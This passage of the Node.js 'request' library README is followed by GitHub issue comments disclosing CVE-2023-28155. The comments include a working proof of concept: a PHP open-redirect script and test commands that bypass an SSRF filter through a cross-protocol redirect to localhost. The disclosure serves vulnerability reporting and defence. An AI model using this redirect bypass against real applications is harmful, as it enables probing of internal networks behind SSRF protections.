last known token at the time of sending a request, or to compute one on the fly.

## Custom HTTP Headers

HTTP Headers, such as `User-Agent`, can be set in the `options` object.
In the example below, we call the github API to find out the number
of stars and forks for the request repository. This requires a
custom `User-Agent` header as well as https.

```
const request = require('request');

const options = {
  url: 'https://api.github.com/repos/cypress-io/request',
  headers: {
    'User-Agent': 'request'
  }
};

function callback(error, response, body) {
  if (!error && response.statusCode == 200) {
    const info = JSON.parse(body);
    console.log(info.stargazers_count + " Stars");
    console.log(info.forks_count + " Forks");
  }
}

request(options, callback);
```

## Proxies

If you specify a `proxy` option, then the request (and any subsequent
redirects) will be sent via a connection to the proxy server.

If your endpoint is an `https` url, and you are using a proxy, then
request will send a `CONNECT` request to the proxy server *first*, and
then use the supplied connection to connect to the endpoint.

That is, first it will make a request like:

```
HTTP/1.1 CONNECT endpoint-server.com:80
Host: proxy-server.com
User-Agent: whatever user agent you specify

```

and then the proxy server make a TCP connection to `endpoint-server`
on port `80`, and return a response that looks like:

```
HTTP/1.1 200 OK

```

At this point, the connection is left open, and the client is
communicating directly with the `endpoint-server.com` machine.

See [the wikipedia page on HTTP Tunneling](https://en.wikipedia.org/wiki/HTTP_tunnel)
for more information.

By default, when proxying `http` traffic, request will simply make a
standard proxied `http` request. This is done by making the `url`
section of the initial line of the request a fully qualified url to
the endpoint.

For example, it will make a single request that looks like:

```
HTTP/1.1 GET http://endpoint-server.com/some-url
Host: proxy-server.com
Other-Headers: all go here

request body or whatever

```

Because a pure "http over http" tunnel offers no additional security
or other features, it is generally simpler to go with a
straightforward HTTP proxy in this case. However, if you would like
to force a tunneling proxy, you may set the `tunnel` option to `true`.

You can also make a standard proxied `http` request by explicitly setting
`tunnel : false`, but **note that this will allow the proxy to see the traffic
to/from the destination server**.

If you are using a tunneling proxy, you may set the
`proxyHeaderWhiteList` to share certain headers with the proxy.

You can also set the `proxyHeaderExclusiveList` to share certain
headers only with the proxy and not with destination host.

By default, this set is:

```
accept
accept-charset
accept-encoding
accept-language
accept-ranges
cache-control
content-encoding
content-language
content-length
content-location
content-md5
content-range
content-type
connection
date
expect
max-forwards
pragma
proxy-authorization
referer
te
transfer-encoding
user-agent
via

```

Note that, when using a tunneling proxy, the `proxy-authorization`
header and any headers from custom `proxyHeaderExclusiveList` are
*never* sent to the endpoint server, but only to the proxy server.

### Controlling proxy behaviour using environment variables

The following environment variables are respected by `request`:

* `HTTP_PROXY` / `http_proxy`
* `HTTPS_PROXY` / `https_proxy`
* `NO_PROXY` / `no_proxy`

When `HTTP_PROXY` / `http_proxy` are set, they will be used to proxy non-SSL requests that do not have an explicit `proxy` configuration option present. Similarly, `HTTPS_PROXY` / `https_proxy` will be respected for SSL requests that do not have an explicit `proxy` configuration option. It is valid to define a proxy in one of the environment variables, but then override it for a specific request, using the `proxy` configuration option. Furthermore, the `proxy` configuration option can be explicitly set to false / null to opt out of proxying altogether for that request.

`request` is also aware of the `NO_PROXY`/`no_proxy` environment variables. These variables provide a granular way to opt out of proxying, on a per-host basis. It should contain a comma separated list of hosts to opt out of proxying. It is also possible to opt of proxying when a particular destination port is used. Finally, the variable may be set to `*` to opt out of the implicit proxy configuration of the other environment variables.

Here's some examples of valid `no_proxy` values:

* `google.com` - don't proxy HTTP/HTTPS requests to Google.
* `google.com:443` - don't proxy HTTPS requests to Google, but *do* proxy HTTP requests to Google.
* `google.com:443, yahoo.com:80` - don't proxy HTTPS requests to Google, and don't proxy HTTP requests to Yahoo!
* `*` - ignore `https_proxy`/`http_proxy` environment variables altogether.

## UNIX Domain Sockets

`request` supports making requests to [UNIX Domain Sockets](https://en.wikipedia.org/wiki/Unix_domain_socket). To make one, use the following URL scheme:

```
/* Pattern */ 'http://unix:SOCKET:PATH'
/* Example */ request.get('http://unix:/absolute/path/to/unix.socket:/request/path')
```

Note: The `SOCKET` path is assumed to be absolute to the root of the host file system.

## TLS/SSL Protocol

TLS/SSL Protocol options, such as `cert`, `key` and `passphrase`, can be
set directly in `options` object, in the `agentOptions` property of the `options` object, or even in `https.globalAgent.options`. Keep in mind that, although `agentOptions` allows for a slightly wider range of configurations, the recommended way is via `options` object directly, as using `agentOptions` or `https.globalAgent.options` would not be applied in the same way in proxied environments (as data travels through a TLS connection instead of an http/https agent).

```
const fs = require('fs')
    , path = require('path')
    , certFile = path.resolve(__dirname, 'ssl/client.crt')
    , keyFile = path.resolve(__dirname, 'ssl/client.key')
    , caFile = path.resolve(__dirname, 'ssl/ca.cert.pem')
    , request = require('request');

const options = {
    url: 'https://api.some-server.com/',
    cert: fs.readFileSync(certFile),
    key: fs.readFileSync(keyFile),
    passphrase: 'password',
    ca: fs.readFileSync(caFile)
};

request.get(options);
```

### Using `options.agentOptions`

In the example below, we call an API that requires client side SSL certificate
(in PEM format) with passphrase protected private key (in PEM format) and disable the SSLv3 protocol:

```
const fs = require('fs')
    , path = require('path')
    , certFile = path.resolve(__dirname, 'ssl/client.crt')
    , keyFile = path.resolve(__dirname, 'ssl/client.key')
    , request = require('request');

const options = {
    url: 'https://api.some-server.com/',
    agentOptions: {
        cert: fs.readFileSync(certFile),
        key: fs.readFileSync(keyFile),
        // Or use `pfx` property replacing `cert` and `key` when using private key, certificate and CA certs in PFX or PKCS12 format:
        // pfx: fs.readFileSync(pfxFilePath),
        passphrase: 'password',
        securityOptions: 'SSL_OP_NO_SSLv3'
    }
};

request.get(options);
```

It is able to force using SSLv3 only by specifying `secureProtocol`:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        secureProtocol: 'SSLv3_method'
    }
});
```

It is possible to accept other certificates than those signed by generally allowed Certificate Authorities (CAs).
This can be useful, for example, when using self-signed certificates.
To require a different root certificate, you can specify the signing CA by adding the contents of the CA's certificate file to the `agentOptions`.
The certificate the domain presents must be signed by the root certificate specified:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        ca: fs.readFileSync('ca.cert.pem')
    }
});
```

The `ca` value can be an array of certificates, in the event you have a private or internal corporate public-key infrastructure hierarchy. For example, if you want to connect to <https://api.some-server.com> which presents a key chain consisting of:

1. its own public key, which is signed by:
2. an intermediate "Corp Issuing Server", that is in turn signed by:
3. a root CA "Corp Root CA";

you can configure your request as follows:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        ca: [
          fs.readFileSync('Corp Issuing Server.pem'),
          fs.readFileSync('Corp Root CA.pem')
        ]
    }
});
```

## Support for HAR 1.2

The `options.har` property will override the values: `url`, `method`, `qs`, `headers`, `form`, `formData`, `body`, `json`, as well as construct multipart data and read files from disk when `request.postData.params[].fileName` is present without a matching `value`.

A validation step will check if the HAR Request format matches the latest spec (v1.2) and will skip parsing if not matching.

```
  const request = require('request')
  request({
    // will be ignored
    method: 'GET',
    uri: 'http://www.google.com',

    // HTTP Archive Request Object
    har: {
      url: 'http://www.mockbin.com/har',
      method: 'POST',
      headers: [
        {
          name: 'content-type',
          value: 'application/x-www-form-urlencoded'
        }
      ],
      postData: {
        mimeType: 'application/x-www-form-urlencoded',
        params: [
          {
            name: 'foo',
            value: 'bar'
          },
          {
            name: 'hello',
            value: 'world'
          }
        ]
      }
    }
  })

  // a POST request will be sent to http://www.mockbin.com
  // with body an application/x-www-form-urlencoded body:
  // foo=bar&hello=world
```

## request(options, callback)

The first argument can be either a `url` or an `options` object. The only required option is `uri`; all others are optional.

* `uri` || `url` - fully qualified uri or a parsed url object from `url.parse()`
* `baseUrl` - fully qualified uri string used as the base url. Most useful with `request.defaults`, for example when you want to do many requests to the same domain. If `baseUrl` is `https://example.com/api/`, then requesting `/end/point?test=true` will fetch `https://example.com/api/end/point?test=true`. When `baseUrl` is given, `uri` must also be a string.
* `method` - http method (default: `"GET"`)
* `headers` - http headers (default: `{}`)

---

* `qs` - object containing querystring values to be appended to the `uri`
* `qsParseOptions` - object containing options to pass to the [qs.parse](https://github.com/hapijs/qs#parsing-objects) method. Alternatively pass options to the [querystring.parse](https://nodejs.org/docs/v0.12.0/api/querystring.html#querystring_querystring_parse_str_sep_eq_options) method using this format `{sep:';', eq:':', options:{}}`
* `qsStringifyOptions` - object containing options to pass to the [qs.stringify](https://github.com/hapijs/qs#stringifying) method. Alternatively pass options to the [querystring.stringify](https://nodejs.org/docs/v0.12.0/api/querystring.html#querystring_querystring_stringify_obj_sep_eq_options) method using this format `{sep:';', eq:':', options:{}}`. For example, to change the way arrays are converted to query strings using the `qs` module pass the `arrayFormat` option with one of `indices|brackets|repeat`
* `useQuerystring` - if true, use `querystring` to stringify and parse
  querystrings, otherwise use `qs` (default: `false`). Set this option to
  `true` if you need arrays to be serialized as `foo=bar&foo=baz` instead of the
  default `foo[0]=bar&foo[1]=baz`.

---

* `body` - entity body for PATCH, POST and PUT requests. Must be a `Buffer`, `String` or `ReadStream`. If `json` is `true`, then `body` must be a JSON-serializable object.
* `form` - when passed an object or a querystring, this sets `body` to a querystring representation of value, and adds `Content-type: application/x-www-form-urlencoded` header. When passed no options, a `FormData` instance is returned (and is piped to request). See "Forms" section above.
* `formData` - data to pass for a `multipart/form-data` request. See
  [Forms](#forms) section above.
* `multipart` - array of objects which contain their own headers and `body`
  attributes. Sends a `multipart/related` request. See [Forms](#forms) section
  above.
  + Alternatively you can pass in an object `{chunked: false, data: []}` where
    `chunked` is used to specify whether the request is sent in
    [chunked transfer encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)
    In non-chunked requests, data items with body streams are not allowed.
* `preambleCRLF` - append a newline/CRLF before the boundary of your `multipart/form-data` request.
* `postambleCRLF` - append a newline/CRLF at the end of the boundary of your `multipart/form-data` request.
* `json` - sets `body` to JSON representation of value and adds `Content-type: application/json` header. Additionally, parses the response body as JSON.
* `jsonReviver` - a [reviver function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse) that will be passed to `JSON.parse()` when parsing a JSON response body.
* `jsonReplacer` - a [replacer function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify) that will be passed to `JSON.stringify()` when stringifying a JSON request body.

---

* `auth` - a hash containing values `user` || `username`, `pass` || `password`, and `sendImmediately` (optional). See documentation above.
* `hawk` - options for [Hawk signing](https://github.com/hueniverse/hawk). The `credentials` key must contain the necessary signing info, [see hawk docs for details](https://github.com/hueniverse/hawk#usage-example).
* `aws` - `object` containing AWS signing information. Should have the properties `key`, `secret`, and optionally `session` (note that this only works for services that require session as part of the canonical string). Also requires the property `bucket`, unless you’re specifying your `bucket` as part of the path, or the request doesn’t use a bucket (i.e. GET Services). If you want to use AWS sign version 4 use the parameter `sign_version` with value `4` otherwise the default is version 2. If you are using SigV4, you can also include a `service` property that specifies the service name. **Note:** you need to `npm install aws4` first.
* `httpSignature` - options for the [HTTP Signature Scheme](https://github.com/joyent/node-http-signature/blob/master/http_signing.md) using [Joyent's library](https://github.com/joyent/node-http-signature). The `keyId` and `key` properties must be specified. See the docs for other options.

---

* `followRedirect` - follow HTTP 3xx responses as redirects (default: `true`). This property can also be implemented as function which gets `response` object as the first argument.
  + *(synchronous usage)* It should return `true` if redirects should continue or `false` otherwise. If it returns a url string, the destination of the redirect will be overridden.
  + *(async callback usage)* If the function has two arguments, it will be treated as an asynchronous function and will be passed a callback as the second argument. Invoke the callback with an error (`null` if no error) and the boolean/url result as the second.
  + *(async promise usage)* Return a promise that resolves to the boolean/url result.
* `followAllRedirects` - follow non-GET HTTP 3xx responses as redirects (default: `false`)
* `followOriginalHttpMethod` - by default we redirect to HTTP method GET. you can enable this property to redirect to the original HTTP method (default: `false`)
* `maxRedirects` - the maximum number of redirects to follow (default: `10`)
* `removeRefererHeader` - removes the referer header when a redirect happens (default: `false`). **Note:** if true, referer header set in the initial request is preserved during redirect chain.
* `allowInsecureRedirect` - allows cross-protocol redirects (HTTP to HTTPS and vice versa). **Warning:** may lead to bypassing anti SSRF filters (default: `false`)

---

* `encoding` - encoding to be used on `setEncoding` of response data. If `null`, the `body` is returned as a `Buffer`. Anything else **(including the default value of `undefined`)** will be passed as the [encoding](http://nodejs.org/api/buffer.html#buffer_buffer) parameter to `toString()` (meaning this is effectively `utf8` by default). (**Note:** if you expect binary data, you should set `encoding: null`.)
* `gzip` - if `true`, add an `Accept-Encoding` header to request compressed content encodings from the server (if not already present) and decode supported content encodings in the response. **Note:** Automatic decoding of the response content is performed on the body data returned through `request` (both through the `request` stream and passed to the callback function) but is not performed on the `response` stream (available from the `response` event) which is the unmodified `http.IncomingMessage` object which may contain compressed data. See example below.
* `jar` - if `true`, remember cookies for future use (or define your custom cookie jar; see examples section)

---

* `agent` - `http(s).Agent` instance to use
* `agentClass` - alternatively specify your agent's class name
* `agentOptions` - and pass its options. **Note:** for HTTPS see [tls API doc for TLS/SSL options](http://nodejs.org/api/tls.html#tls_tls_connect_options_callback) and the [documentation above](#using-optionsagentoptions).
* `forever` - set to `true` to use the [forever-agent](https://github.com/request/forever-agent) **Note:** Defaults to `http(s).Agent({keepAlive:true})` in node 0.12+
* `pool` - an object describing which agents to use for the request. If this option is omitted the request will use the global agent (as long as your options allow for it). Otherwise, request will search the pool for your custom agent. If no custom agent is found, a new agent will be created and added to the pool. **Note:** `pool` is used only when the `agent` option is not specified.
  + A `maxSockets` property can also be provided on the `pool` object to set the max number of sockets for all agents created (ex: `pool: {maxSockets: Infinity}`).
  + Note that if you are sending multiple requests in a loop and creating
    multiple new `pool` objects, `maxSockets` will not work as intended. To
    work around this, either use [`request.defaults`](#requestdefaultsoptions)
    with your pool options or create the pool object with the `maxSockets`
    property outside of the loop.
* `timeout` - integer containing number of milliseconds, controls two timeouts.
  + **Read timeout**: Time to wait for a server to send response headers (and start the response body) before aborting the request.
  + **Connection timeout**: Sets the socket to timeout after `timeout` milliseconds of inactivity. Note that increasing the timeout beyond the OS-wide TCP connection timeout will not have any effect ([the default in Linux can be anywhere from 20-120 seconds](http://www.sekuda.com/overriding_the_default_linux_kernel_20_second_tcp_socket_connect_timeout))

---

* `localAddress` - local interface to bind for network connections.
* `proxy` - an HTTP proxy to be used. Supports proxy Auth with Basic Auth, identical to support for the `url` parameter (by embedding the auth info in the `uri`)
* `strictSSL` - if `true`, requires SSL certificates be valid. **Note:** to use your own certificate authority, you need to specify an agent that was created with that CA as an option.
* `tunnel` - controls the behavior of
  [HTTP `CONNECT` tunneling](https://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_tunneling)
  as follows:
  + `undefined` (default) - `true` if the destination is `https`, `false` otherwise
  + `true` - always tunnel to the destination by making a `CONNECT` request to
    the proxy
  + `false` - request the destination as a `GET` request.
* `proxyHeaderWhiteList` - a whitelist of headers to send to a
  tunneling proxy.
* `proxyHeaderExclusiveList` - a whitelist of headers to send
  exclusively to a tunneling proxy and not to destination.

---

* `time` - if `true`, the request-response cycle (including all redirects) is timed at millisecond resolution. When set, the following properties are added to the response object:

  + `elapsedTime` Duration of the entire request/response in milliseconds (*deprecated*).
  + `responseStartTime` Timestamp when the response began (in Unix Epoch milliseconds) (*deprecated*).
  + `timingStart` Timestamp of the start of the request (in Unix Epoch milliseconds).
  + `timings` Contains event timestamps in millisecond resolution relative to `timingStart`. If there were redirects, the properties reflect the timings of the final request in the redirect chain:
    - `socket` Relative timestamp when the [`http`](https://nodejs.org/api/http.html#http_event_socket) module's `socket` event fires. This happens when the socket is assigned to the request.
    - `lookup` Relative timestamp when the [`net`](https://nodejs.org/api/net.html#net_event_lookup) module's `lookup` event fires. This happens when the DNS has been resolved.
    - `connect`: Relative timestamp when the [`net`](https://nodejs.org/api/net.html#net_event_connect) module's `connect` event fires. This happens when the server acknowledges the TCP connection.
    - `response`: Relative timestamp when the [`http`](https://nodejs.org/api/http.html#http_event_response) module's `response` event fires. This happens when the first bytes are received from the server.
    - `end`: Relative timestamp when the last bytes of the response are received.
  + `timingPhases` Contains the durations of each request phase. If there were redirects, the properties reflect the timings of the final request in the redirect chain:
    - `wait`: Duration of socket initialization (`timings.socket`)
    - `dns`: Duration of DNS lookup (`timings.lookup` - `timings.socket`)
    - `tcp`: Duration of TCP connection (`timings.connect` - `timings.socket`)
    - `firstByte`: Duration of HTTP server response (`timings.response` - `timings.connect`)
    - `download`: Duration of HTTP download (`timings.end` - `timings.response`)
    - `total`: Duration entire HTTP round-trip (`timings.end`)
* `har` - a [HAR 1.2 Request Object](http://www.softwareishard.com/blog/har-12-spec/#request), will be processed from HAR format into options overwriting matching values *(see the [HAR 1.2 section](#support-for-har-12) for details)*
* `callback` - alternatively pass the request's callback in the options object

The callback argument gets 3 arguments:

1. An `error` when applicable (usually from [`http.ClientRequest`](http://nodejs.org/api/http.html#http_class_http_clientrequest) object)
2. An [`http.IncomingMessage`](https://nodejs.org/api/http.html#http_class_http_incomingmessage) object (Response object)
3. The third is the `response` body (`String` or `Buffer`, or JSON object if the `json` option is supplied)

## Convenience methods

There are also shorthand methods for different HTTP METHODs and some other conveniences.

### request.defaults(options)

This method **returns a wrapper** around the normal request API that defaults
to whatever options you pass to it.

**Note:** `request.defaults()` **does not** modify the global request API;
instead, it **returns a wrapper** that has your default settings applied to it.

**Note:** You can call `.defaults()` on the wrapper that is returned from
`request.defaults` to add/override defaults that were previously defaulted.

For example:

```
//requests using baseRequest() will set the 'x-token' header
const baseRequest = request.defaults({
  headers: {'x-token': 'my-token'}
})

//requests using specialRequest() will include the 'x-token' header set in
//baseRequest and will also include the 'special' header
const specialRequest = baseRequest.defaults({
  headers: {special: 'special value'}
})
```

### request.METHOD()

These HTTP method convenience functions act just like `request()` but with a default method already set for you:

* *request.get()*: Defaults to `method: "GET"`.
* *request.post()*: Defaults to `method: "POST"`.
* *request.put()*: Defaults to `method: "PUT"`.
* *request.patch()*: Defaults to `method: "PATCH"`.
* *request.del() / request.delete()*: Defaults to `method: "DELETE"`.
* *request.head()*: Defaults to `method: "HEAD"`.
* *request.options()*: Defaults to `method: "OPTIONS"`.

### request.cookie()

Function that creates a new cookie.

```
request.cookie('key1=value1')
```

### request.jar()

Function that creates a new cookie jar.

```
request.jar()
```

### response.caseless.get('header-name')

Function that returns the specified response header field using a [case-insensitive match](https://tools.ietf.org/html/rfc7230#section-3.2)

```
request('http://www.google.com', function (error, response, body) {
  // print the Content-Type header even if the server returned it as 'content-type' (lowercase)
  console.log('Content-Type is:', response.caseless.get('Content-Type'));
});
```

## Debugging

There are at least three ways to debug the operation of `request`:

1. Launch the node process like `NODE_DEBUG=request node script.js`
   (`lib,request,otherlib` works too).
2. Set `require('request').debug = true` at any time (this does the same thing
   as #1).
3. Use the [request-debug module](https://github.com/cypress-io/request-debug) to
   view request and response headers and bodies.

## Timeouts

Most requests to external servers should have a timeout attached, in case the
server is not responding in a timely manner. Without a timeout, your code may
have a socket open/consume resources for minutes or more.

There are two main types of timeouts: **connection timeouts** and **read
timeouts**. A connect timeout occurs if the timeout is hit while your client is
attempting to establish a connection to a remote machine (corresponding to the
[connect() call](http://linux.die.net/man/2/connect) on the socket). A read timeout occurs any time the
server is too slow to send back a part of the response.

These two situations have widely different implications for what went wrong
with the request, so it's useful to be able to distinguish them. You can detect
timeout errors by checking `err.code` for an 'ETIMEDOUT' value. Further, you
can detect whether the timeout was a connection timeout by checking if the
`err.connect` property is set to `true`.

```
request.get('http://10.255.255.1', {timeout: 1500}, function(err) {
    console.log(err.code === 'ETIMEDOUT');
    // Set to `true` if the timeout was a connection timeout, `false` or
    // `undefined` otherwise.
    console.log(err.connect === true);
    process.exit(0);
});
```

## Examples:

```
  const request = require('request')
    , rand = Math.floor(Math.random()*100000000).toString()
    ;
  request(
    { method: 'PUT'
    , uri: 'http://mikeal.iriscouch.com/testjs/' + rand
    , multipart:
      [ { 'content-type': 'application/json'
        ,  body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
        }
      , { body: 'I am an attachment' }
      ]
    }
  , function (error, response, body) {
      if(response.statusCode == 201){
        console.log('document saved as: http://mikeal.iriscouch.com/testjs/'+ rand)
      } else {
        console.log('error: '+ response.statusCode)
        console.log(body)
      }
    }
  )
```

For backwards-compatibility, response compression is not supported by default.
To accept gzip-compressed responses, set the `gzip` option to `true`. Note
that the body data passed through `request` is automatically decompressed
while the response object is unmodified and will contain compressed data if
the server sent a compressed response.

```
  const request = require('request')
  request(
    { method: 'GET'
    , uri: 'http://www.google.com'
    , gzip: true
    }
  , function (error, response, body) {
      // body is the decompressed response body
      console.log('server encoded the data as: ' + (response.headers['content-encoding'] || 'identity'))
      console.log('the decoded data is: ' + body)
    }
  )
  .on('data', function(data) {
    // decompressed data as it is received
    console.log('decoded chunk: ' + data)
  })
  .on('response', function(response) {
    // unmodified http.IncomingMessage object
    response.on('data', function(data) {
      // compressed data as it is received
      console.log('received ' + data.length + ' bytes of compressed data')
    })
  })
```

Cookies are disabled by default (else, they would be used in subsequent requests). To enable cookies, set `jar` to `true` (either in `defaults` or `options`).

```
const request = request.defaults({jar: true})
request('http://www.google.com', function () {
  request('http://images.google.com')
})
```

To use a custom cookie jar (instead of `request`’s global cookie jar), set `jar` to an instance of `request.jar()` (either in `defaults` or `options`)

```
const j = request.jar()
const request = request.defaults({jar:j})
request('http://www.google.com', function () {
  request('http://images.google.com')
})
```

OR

```
const j = request.jar();
const cookie = request.cookie('key1=value1');
const url = 'http://www.google.com';
j.setCookie(cookie, url);
request({url: url, jar: j}, function () {
  request('http://images.google.com')
})
```

To use a custom cookie store (such as a
[`FileCookieStore`](https://github.com/mitsuru/tough-cookie-filestore)
which supports saving to and restoring from JSON files), pass it as a parameter
to `request.jar()`:

```
const FileCookieStore = require('tough-cookie-filestore');
// NOTE - currently the 'cookies.json' file must already exist!
const j = request.jar(new FileCookieStore('cookies.json'));
request = request.defaults({ jar : j })
request('http://www.google.com', function() {
  request('http://images.google.com')
})
```

The cookie store must be a
[`tough-cookie`](https://github.com/SalesforceEng/tough-cookie)
store and it must support synchronous operations; see the
[`CookieStore` API docs](https://github.com/SalesforceEng/tough-cookie#api)
for details.

To inspect your cookie jar after a request:

```
const j = request.jar()
request({url: 'http://www.google.com', jar: j}, function () {
  const cookie_string = j.getCookieString(url); // "key1=value1; key2=value2; ..."
  const cookies = j.getCookies(url);
  // [{key: 'key1', value: 'value1', domain: "www.google.com", ...}, ...]
})
```

| Summary I am a security researcher at [Doyensec](https://doyensec.com/).  During a security engagement I have identified a security vulnerability in the Request library. In a spirit of a Responsible Disclosure we have tried to contact the maintainer directly on 12/02/2022 and 01/18/2023 via [email](mikeal.rogers%40gmail.com), but we have received no answer.  Please provide a communication channel that would allow us to share the technical details and the proposed fix, otherwise we will be forced to disclose the vulnerability publicly.  You can contact me via email: szymon@doyensec.com |

### **[SzymonDrosdzol](/SzymonDrosdzol)** commented [Mar 16, 2023](#issuecomment-1471912620)

| Summary A Server Side Request Forgery (SSRF) attack describes the ability of an attacker to create network connections from a vulnerable web application to the internal network and other Internet hosts. Frequently, a SSRF vulnerability is used to attack internal services placed behind a firewall and not directly accessible from the Internet.  The Request library can be leveraged to initiate an HTTP / HTTPS connection and potentially gather information about the victim's internal infrastructure even if there's anti-SSRF filtering in place.  The issue has been assigned with a [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6 "CVE-2023-28155") identification number. Technical Description In JavaScript HTTP clients the SSRF filters utilize the HTTP(S) agents to hook to the `onConnect` event to filter the target hosts before the communication starts. In case of a redirect with a protocol switch (eg. HTTP redirecting to HTTPS) the library deletes the agent, all event listeners and SSRF protection in the process. This behavior can be observed in the `lib/redirect.js`:  ``` // handle the case where we change protocol from https to http or vice versa if (request.uri.protocol !== uriPrev.protocol) {   delete request.agent } ``` Reproduction Steps The issue can be demonstrated using the following steps:   1. Prepare an attacker-controlled server with the ability to redirect to arbitrary URLs. Example PHP script:  ``` <?php  header('Location: '.$_GET["target"]); ?> ```  2. Set up a local HTTP server.  ``` $ python3 -m http.server 80 ```  3. Prepare a test script with anti-SSRF protection plugged into request library:  ``` const request = require('request'); const ssrfFilter = require('ssrf-req-filter');  let url = process.argv[2]; console.log("Testing", url);  request({     uri: url,     agent: ssrfFilter(url), });  console.log("OK"); ```  4. For the sake of an example, I have placed the redirect script on my server `tellico.fun`. 5. Verify that in case of a redirect without protocol switch the SSRF attempt is blocked:  ``` $ node dev/request.js "https://tellico.fun/redirect.php?target=https://localhost/test" Testing https://tellico.fun/redirect.php?target=https://localhost/test events.js:353       throw er; // Unhandled 'error' event       ^  Error: Call to 127.0.0.1 is blocked. ```  6. Verify that in case of cross-protocol redirect the SSRF is still possible (also the local HTTP server logs should show the incoming request):  ``` $ node dev/request.js "https://tellico.fun/redirect.php?target=http://localhost/test" Testing https://tellico.fun/redirect.php?target=http://localhost/test OK ``` |

| I imagine this is where the problem lies?: <https://github.com/request/request/blame/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/lib/redirect.js#L111>  I'm having a hard time deciding if this should be considered a requestjs "vuln" or if its more of a "bug". It looks like requestjs was always vulnerable to SSRFs, and `ssrf-req-filter` is what fixed the problem. But given how requestjs is written, this bug is the way to bypass `ssrf-req-filter`.  Either way, it looks unfixable without editing requestjs's source.  And given that requestjs has been deprecated for years, my guess is this won't be fixed. So wouldnt this mean its now time to move to other libraries? At least for companies that need to keep their `npm audit`s "up to code" |

| Tangential call for help, and question addressed to subscribers of this issue: is it clear to you how to get SSRF protection in recently-introdued-in-node18 `fetch` like we do in axios/request with a plugin like ssrf-req-filter? (Putting this CVE aside, of course).  It's not to me. Community implementation `node-fetch` has support for something similar, but I can't find anything in the new implementation maintained by nodejs based on undici. I created [nodejs/undici#2019](https://github.com/nodejs/undici/issues/2019) with details, any clues welcome there.  **END Tangential call for help, sorry for the mild noise, please comment about SSRF-in-native-node-fetch at [nodejs/undici#2019](https://github.com/nodejs/undici/issues/2019) , not here.** |

| Hi [@KernowSec](https://github.com/KernowSec)  It seems that the `request-promise` is a simple wrapper around the original `request` library, so I would expect it to be just as vulnerable. Reproduction will be probably very similar to the original too.  The `request-promise` is also considered deprecated, so the best recommendation is to plan the migration to other libraries. |
